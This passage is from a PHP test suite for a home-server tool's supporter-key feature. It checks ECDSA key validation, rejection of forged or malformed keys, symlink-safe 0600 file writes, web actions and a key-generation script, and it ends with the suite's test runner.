        $asked[] = officeSupporterAskDue($data, false, $now + 29 * $day);
        $now += 30 * $day;
    }
    same('ask: «Not now» asks again in 30 days, at most twice more', [true, false, true, false, true, false, false, false], $asked);
    same('ask: «Don\'t ask again»', false, officeSupporterAskDue(officeSupporterAnswer(['first_seen' => $t0], 'never', $t0), false, $t0 + 100 * $day));

    // the file: first_seen once, 0600, never through a link, nothing without data/office
    $file = "$tmp/office/supporter.json";
    same('store: no data/office yet — nothing', null, officeSupporterStore($file, fn (array $d): array => $d, $t0));
    mkdir("$tmp/office", 0700);
    file_put_contents("$tmp/victim", 'keep');
    symlink("$tmp/victim", $file);
    $stored = officeSupporterStore($file, fn (array $d): array => $d, $t0);
    same('store: first sight stamped', $t0, $stored['first_seen'] ?? null);
    check('store: the victim behind a link is untouched, the link replaced', file_get_contents("$tmp/victim") === 'keep' && !is_link($file) && is_file($file));
    same('store: mode 0600', '600', substr(sprintf('%o', fileperms($file)), -3));
    same('store: first sight kept', $t0, officeSupporterStore($file, fn (array $d): array => $d + ['x' => 1], $t0 + 99)['first_seen'] ?? null);
    same('store: no temporary files left', [], glob("$tmp/office/.*.tmp") ?: []);

    // the office actions through the web side, in a process of its own (bootstrap.php, the data folder in $tmp)
    [$make, , $pub] = supporterTestKeys($tmp);
    $server = officeServerId();             // this host's (read only); null where var.ini names no GUID
    $payload = fn (string $id, string $name = 'Ana', string $date = '2026-10-06'): string => json_encode(['v' => 1, 'id' => $id, 'name' => $name, 'date' => $date], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    $mine = $make($payload($server ?? '0000-0000-0000-0000', 'Ana Müller'));
    $theirs = $make($payload($server === 'AAAA-AAAA-AAAA-AAAA' ? 'BBBB-BBBB-BBBB-BBBB' : 'AAAA-AAAA-AAAA-AAAA'));
    @unlink($file);
    $web = "$tmp/web.php";
    file_put_contents($web, '<?php require ' . var_export(OFFICE_DIR . '/src/bootstrap.php', true) . '; $out = [officeSupporterPage()];'
        . ' foreach (json_decode(stream_get_contents(STDIN), true) as [$a, $d]) { try { $out[] = officeSupporterAction($a, $d); }'
        . ' catch (OfficeProblem $e) { $out[] = ["error" => $e->key, "params" => $e->params]; } } $out[] = officeSupporterPage(); echo json_encode($out);');
    $steps = [['office.supporter_set', ['key' => 'USO1.nonsense.x']], ['office.supporter_set', ['key' => $theirs]],
              ['office.supporter_set', ['key' => "  " . chunk_split($mine, 50, "\n")]], ['office.supporter_ask', ['answer' => 'maybe']],
              ['office.supporter_ask', ['answer' => 'later']], ['office.supporter_remove', []], ['office.supporter_ask', ['answer' => 'never']]];
    $webRun = function (array $steps) use ($web, $tmp, $pub): array {
        $p = proc_open([PHP_BINARY, $web], [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
            ['OFFICE_DATA_DIR' => $tmp, 'OFFICE_SUPPORTER_PUBKEY' => $pub, 'PATH' => getenv('PATH')]);
        fwrite($pipes[0], json_encode($steps));
        fclose($pipes[0]);
        $raw = (string) stream_get_contents($pipes[1]);
        $err = (string) stream_get_contents($pipes[2]);
        proc_close($p);
        return [json_decode($raw, true) ?: [], $raw . $err];
    };
    [$out, $raw] = $webRun(array_slice($steps, 0, 3));
    check('web: the page stamps the first sight', ($out[0]['state'] ?? null) === 'none' && ($out[0]['ask'] ?? null) === false && ($out[0]['id'] ?? false) === $server, $raw);
    same('web: a broken key refused', 'supporter_invalid', $out[1]['error'] ?? null);
    same('web: a key for another server refused', $server === null ? 'supporter_no_id' : 'supporter_other_server', $out[2]['error'] ?? null);
    if ($server !== null) {
        same('web: a key for this server (broken over lines, as from a mail) taken', ['valid', 'Ana Müller', false], [$out[3]['supporter']['state'] ?? null, $out[3]['supporter']['name'] ?? null, $out[3]['supporter']['ask'] ?? null]);
        $saved = json_decode((string) @file_get_contents($file), true) ?: [];
        same('web: the key kept without whitespace', $mine, $saved['key'] ?? null);
        same('web: the page sees it', ['valid', 'Ana Müller'], [$out[4]['state'] ?? null, $out[4]['name'] ?? null]);
    }
    [$out, $raw] = $webRun(array_slice($steps, 3));
    same('web: an odd answer refused', 'bad_request', $out[1]['error'] ?? null);
    same('web: «Not now», «Remove», «Don\'t ask again» answered', [true, 'none', false], [$out[2]['ok'] ?? null, $out[3]['supporter']['state'] ?? null, $out[4]['supporter']['ask'] ?? null]);
    $saved = json_decode((string) @file_get_contents($file), true) ?: [];
    same('web: only the key went, the answers stay', [false, true, 1, true], [isset($saved['key']), isset($saved['first_seen']), $saved['ask']['later'] ?? null, $saved['ask']['never'] ?? null]);
    same('web: the file is 0600', '600', substr(sprintf('%o', @fileperms($file)), -3));
    hardeningRm($tmp);
}

/** Supporter keys are checked strictly: the signature, the shape, anchored validators — and the real public key against the tool */
function testSupporterKeys(): void
{
    require_once OFFICE_DIR . '/src/supporter.php';
    $tmp = hardeningTmp('supporter-keys');
    $id = 'ABCD-0123-4567-89EF';

    // a key tools/supporter-key.sh made on the maintainer's Mac (for an ID no server has) — the real public key
    $real = 'USO1.eyJ2IjoxLCJpZCI6IjAwMDAtMDAwMC0wMDAwLTAwMDEiLCJuYW1lIjoiVGVzdCBNw7xsbGVyIFwicXVvdGVcIiBcXCBiYWNrIiwiZGF0ZSI6IjIwMjYtMTAtMDYifQ'
        . '.MEUCIQDtyMwC_Pr4iR191QINIXSWZccdtg4riRyv085omtdcmgIgbKhDsDK0Wk_jCKf8JU9fX9eh9T77JM-31UqrkDb-b6s';
    putenv('OFFICE_SUPPORTER_PUBKEY');
    same('key: one made by the tool, checked with the office\'s public key', ['state' => 'valid', 'id' => '0000-0000-0000-0001', 'name' => 'Test Müller "quote" \\ back', 'date' => '2026-10-06'],
        officeSupporterCheck($real, '0000-0000-0000-0001'));

    [$make, $private, $pub] = supporterTestKeys($tmp);
    putenv("OFFICE_SUPPORTER_PUBKEY=$pub");
    same('key: the real one is nothing to a test key pair', 'invalid', officeSupporterCheck($real, '0000-0000-0000-0001')['state']);
    $json = fn (array $p): string => json_encode($p, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    $ok = ['v' => 1, 'id' => $id, 'name' => 'Ana', 'date' => '2026-10-06'];
    $key = $make($json($ok));
    same('key: valid for this server', ['state' => 'valid', 'id' => $id, 'name' => 'Ana', 'date' => '2026-10-06'], officeSupporterCheck($key, $id));
    same('key: for another server', 'other', officeSupporterCheck($key, 'ABCD-0123-4567-89EE')['state']);
    same('key: without a server ID, for another one', 'other', officeSupporterCheck($key, null)['state']);
    same('key: whitespace from a mail is fine', 'valid', officeSupporterCheck(" \n" . chunk_split($key, 40, "\r\n"), $id)['state']);
    $sig = substr($key, strrpos($key, '.'));
    $refused = [
        'another payload under the signature' => 'USO1.' . officeB64url($json(array_replace($ok, ['name' => 'Eve']))) . $sig,
        'another key pair' => (function () use ($make, $json, $ok) {
            return $make($json($ok), openssl_pkey_new(['private_key_type' => OPENSSL_KEYTYPE_EC, 'curve_name' => 'prime256v1']));
        })(),
        'USO2' => 'USO2' . substr($key, 4),
        'padding' => $key . '=',
        'a character outside base64url' => substr($key, 0, 10) . '+' . substr($key, 11),
        'too long' => $key . str_repeat('A', 1000),
        'no signature' => substr($key, 0, strrpos($key, '.')),
        'a key more' => $make($json($ok + ['extra' => 1])),
        'a key less' => $make($json(['v' => 1, 'id' => $id, 'name' => 'Ana'])),
        'another order' => $make($json(['id' => $id, 'v' => 1, 'name' => 'Ana', 'date' => '2026-10-06'])),
        'version 2' => $make($json(array_replace($ok, ['v' => 2]))),
        'version as text' => $make($json(array_replace($ok, ['v' => '1']))),
        'id in lower case' => $make($json(array_replace($ok, ['id' => strtolower($id)]))),
        'id with a newline' => $make($json(array_replace($ok, ['id' => "$id\n"]))),
        'name too long' => $make($json(array_replace($ok, ['name' => str_repeat('n', 61)]))),
        'name with a newline' => $make($json(array_replace($ok, ['name' => "Ana\n"]))),
        'name with a control character' => $make($json(array_replace($ok, ['name' => "A\x07na"]))),
        'name with a line separator' => $make($json(array_replace($ok, ['name' => "A\u{2028}na"]))),
        'name with a zero-width space' => $make($json(array_replace($ok, ['name' => "A\u{200B}na"]))),
        'name with a space in front' => $make($json(array_replace($ok, ['name' => ' Ana']))),
        'empty name' => $make($json(array_replace($ok, ['name' => '']))),
        'name as a list' => $make($json(array_replace($ok, ['name' => ['Ana']]))),
        'no such day' => $make($json(array_replace($ok, ['date' => '2026-02-30']))),
        'date with a newline' => $make($json(array_replace($ok, ['date' => "2026-10-06\n"]))),
        'not JSON' => $make('Ana'),
        'nested' => $make('{"v":1,"id":"' . $id . '","name":{"a":"b"},"date":"2026-10-06"}'),
    ];
    foreach ($refused as $what => $bad) {
        same("key refused: $what", 'invalid', officeSupporterCheck($bad, $id)['state']);
    }
    same('key: 60 characters of a name (not bytes)', 'valid', officeSupporterCheck($make($json(array_replace($ok, ['name' => str_repeat('ü', 60)]))), $id)['state']);
    // the payload is checked as transmitted, never re-encoded: another JSON spelling of the same shape counts
    same('key: JSON with spaces and \\u escapes', ['valid', 'Zü'], array_values(array_intersect_key(
        officeSupporterCheck($make('{ "v": 1, "id": "' . $id . '", "name": "Z\\u00fc", "date": "2026-10-06" }'), $id), ['state' => 1, 'name' => 1])));
    // DER only: WebCrypto's raw r||s (64 bytes) must be converted first
    $der = (string) officeB64urlDecode(substr($key, strrpos($key, '.') + 1));
    $rl = ord($der[3]);
    $sl = ord($der[5 + $rl]);
    $raw = str_pad(ltrim(substr($der, 4, $rl), "\0"), 32, "\0", STR_PAD_LEFT) . str_pad(ltrim(substr($der, 6 + $rl, $sl), "\0"), 32, "\0", STR_PAD_LEFT);
    same('key: a raw r||s signature (not DER) refused', 'invalid', officeSupporterCheck(substr($key, 0, strrpos($key, '.') + 1) . officeB64url($raw), $id)['state']);
    check('anchored: a server ID with a trailing newline refused', preg_match(OFFICE_SUPPORTER_ID, "$id\n") === 0);
    check('anchored: a GUID with a trailing newline gives no ID', officeServerIdOf("0781-5583-A1B2-123456789012\n") === null);
    check('anchored: a name with a trailing newline refused', !officeSupporterNameOk("Ana\n"));
    same('base64url: only the canonical spelling', ['a', null, null, null], [officeB64urlDecode('YQ'), officeB64urlDecode('YR'), officeB64urlDecode('YQ=='), officeB64urlDecode('Y')]);

    // the maintainer's tool (bash + openssl) with the test key pair: what it makes, PHP takes
    $tool = OFFICE_DIR . '/tools/supporter-key.sh';
    $env = ['USO_SUPPORTER_KEY' => $private, 'USO_SUPPORTER_PUB' => $pub, 'PATH' => getenv('PATH'), 'HOME' => $tmp, 'TMPDIR' => $tmp];
    $run = function (array $args, array $env) use ($tool): array {
        $p = proc_open(array_merge(['bash', $tool], $args), [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null, $env);
        fclose($pipes[0]);
        $out = (string) stream_get_contents($pipes[1]);
        $err = (string) stream_get_contents($pipes[2]);
        return [proc_close($p), trim($out), $err];
    };
    [$code, $made, $err] = $run([strtolower($id), 'Zoë "Z" O\'Neil \\ Co', '2028-02-29'], $env);
    same('tool: a key made', 0, $code);
    same('tool: PHP takes what the tool made', ['state' => 'valid', 'id' => $id, 'name' => 'Zoë "Z" O\'Neil \\ Co', 'date' => '2028-02-29'], officeSupporterCheck($made, $id));
    [$c, $o] = $run(['--verify', $made, $id], $env);
    same('tool: --verify', [0, 'signature: valid'], [$c, strtok($o, "\n")]);
    same('tool: --verify for another server', 1, $run(['--verify', $made, 'ABCD-0123-4567-89EE'], $env)[0]);
    same('tool: --verify of a broken key', 1, $run(['--verify', substr($made, 0, -2) . 'AA', $id], $env)[0]);
    foreach (['a name with a tab' => [$id, "A\tB"], 'a name with a space in front' => [$id, ' Ana'], 'a name too long' => [$id, str_repeat('n', 61)],
              'an odd ID' => ['ABCD-0123-4567', 'Ana'], 'no such day' => [$id, 'Ana', '2026-02-29'], 'a date with a newline' => [$id, 'Ana', "2026-10-06\n"]] as $what => $args) {
        [$c, $o] = $run($args, $env);
        check("tool refuses $what", $c !== 0 && $o === '', "exit $c: $o");
    }
    [$c, $o] = $run([$id, 'Ana'], ['USO_SUPPORTER_PUB' => ''] + $env);
    check('tool: a private key that isn\'t the office\'s makes no key', $c !== 0 && $o === '', "exit $c: $o");
    same('tool: leaves no temporary folder', [], glob("$tmp/uso-supporter.*") ?: []);
    putenv('OFFICE_SUPPORTER_PUBKEY');
    hardeningRm($tmp);
}

// ===================================================================== run

$parts = ['logic' => ['testCron', 'testRetention', 'testSnapshotNames', 'testEmby', 'testEmbyWatch', 'testEmbyImport', 'testOfficeCron', 'testMenuName', 'testEstimates', 'testBackupFirstUpload', 'testNotify', 'testCaretakerAcks',
                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testBackupSkip', 'testBackupVmOrder', 'testBackupArrayStop', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreShares', 'testRestoreFindings', 'testRestoreDatabases', 'testAdvisor', 'testAdvisorInstall', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanPosture', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testExclusive',
                      'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereTakeOver', 'testWhereDesk', 'testStaffMerged', 'testMovedDesk', 'testSupporter', 'testLeftovers'],
          'hardening' => ['testSafeWrites', 'testAgentRestarted', 'testSnapshotRecord', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys'],
          'strings' => ['testStrings']];
$only = $argv[1] ?? '';
foreach ($parts as $name => $fns) {
    if ($only === '' || $only === $name) {
        foreach ($fns as $t) {
            $t();
        }
    }
}
$fail = $GLOBALS['results']['fail'];
foreach ($fail as $f) {
    echo "FAIL  $f\n";
}
printf("%d passed, %d failed\n", $GLOBALS['results']['pass'], count($fail));
exit($fail ? 1 : 0);
